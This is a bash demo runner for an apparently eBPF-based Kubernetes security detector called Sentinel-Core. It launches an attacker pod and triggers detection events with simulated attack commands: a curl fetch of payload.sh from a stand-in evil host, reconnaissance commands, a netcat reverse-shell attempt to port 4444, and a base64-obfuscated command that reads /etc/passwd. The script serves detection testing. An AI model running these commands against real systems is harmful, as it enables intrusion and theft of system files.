#!/usr/bin/env bash
# ─────────────────────────────────────────────────────────────────
# Sentinel-Core — Demo Runner
# Deploys an attacker pod and shows live event output.
# ─────────────────────────────────────────────────────────────────
set -euo pipefail

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
PROJECT_ROOT="$(cd "$SCRIPT_DIR/.." && pwd)"

CYAN='\033[0;36m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
RED='\033[0;31m'
MAGENTA='\033[0;35m'
NC='\033[0m'

info()  { echo -e "${CYAN}[INFO]${NC}  $*"; }
ok()    { echo -e "${GREEN}[OK]${NC}    $*"; }
warn()  { echo -e "${YELLOW}[WARN]${NC}  $*"; }

echo -e "${MAGENTA}"
echo "╔══════════════════════════════════════════════════════════╗"
echo "║          🔥 SENTINEL-CORE — LIVE DEMO 🔥               ║"
echo "║      eBPF Kernel Security Event Detection               ║"
echo "╚══════════════════════════════════════════════════════════╝"
echo -e "${NC}"

# ── Check prerequisites ──────────────────────────────────────────
kubectl cluster-info &>/dev/null || { echo -e "${RED}[FAIL]${NC} No Kubernetes cluster found. Run 'make up' first."; exit 1; }

# ── Step 1: Deploy attacker pod ──────────────────────────────────
info "Deploying attacker simulation pod..."
kubectl apply -f "$PROJECT_ROOT/demo/attacker-pod.yaml"

info "Waiting for attacker pod to be ready..."
kubectl wait --for=condition=Ready pod/attacker-pod --timeout=60s 2>/dev/null || true
ok "Attacker pod deployed."

# ── Step 2: Show what we're monitoring ───────────────────────────
echo ""
info "TracingPolicies active:"
kubectl get tracingpolicies 2>/dev/null || kubectl get tp 2>/dev/null || warn "No TracingPolicies found."
echo ""

# ── Step 3: Execute attack simulation ────────────────────────────
warn "🚨 Executing attack simulation in 3 seconds..."
sleep 3

echo -e "${RED}═══════════════════════════════════════════════════════${NC}"
echo -e "${RED}  ATTACK SIMULATION STARTING                          ${NC}"
echo -e "${RED}═══════════════════════════════════════════════════════${NC}"

# Simulate: data exfiltration via curl
info "[Attack 1/4] Suspicious curl to external URL..."
kubectl exec attacker-pod -- curl -sk http://evil.example.com/payload.sh 2>/dev/null || true
sleep 1

# Simulate: reconnaissance
info "[Attack 2/4] Host reconnaissance (whoami, id, uname)..."
kubectl exec attacker-pod -- whoami 2>/dev/null || true
kubectl exec attacker-pod -- id 2>/dev/null || true
kubectl exec attacker-pod -- uname -a 2>/dev/null || true
sleep 1

# Simulate: reverse shell attempt
info "[Attack 3/4] Reverse shell attempt (nc)..."
kubectl exec attacker-pod -- sh -c "nc -w 1 10.0.0.99 4444 < /dev/null" 2>/dev/null || true
sleep 1

# Simulate: base64 encoded command
info "[Attack 4/4] Obfuscated command execution (base64)..."
kubectl exec attacker-pod -- sh -c "echo 'Y2F0IC9ldGMvcGFzc3dk' | base64 -d | sh" 2>/dev/null || true

echo -e "${RED}═══════════════════════════════════════════════════════${NC}"
echo -e "${RED}  ATTACK SIMULATION COMPLETE                          ${NC}"
echo -e "${RED}═══════════════════════════════════════════════════════${NC}"
echo ""

# ── Step 4: Show forwarder output ────────────────────────────────
info "Check the Event Forwarder for captured events:"
info "  → API:   curl http://localhost:8081/events/latest"
info "  → Redis: redis-cli XRANGE sentinel:events - + COUNT 10"
echo ""

# ── Step 5: Cleanup option ───────────────────────────────────────
read -p "🗑️  Delete attacker pod? [Y/n] " -r
if [[ ! "$REPLY" =~ ^[Nn]$ ]]; then
    kubectl delete pod attacker-pod --grace-period=0 --force 2>/dev/null || true
    ok "Attacker pod deleted."
fi
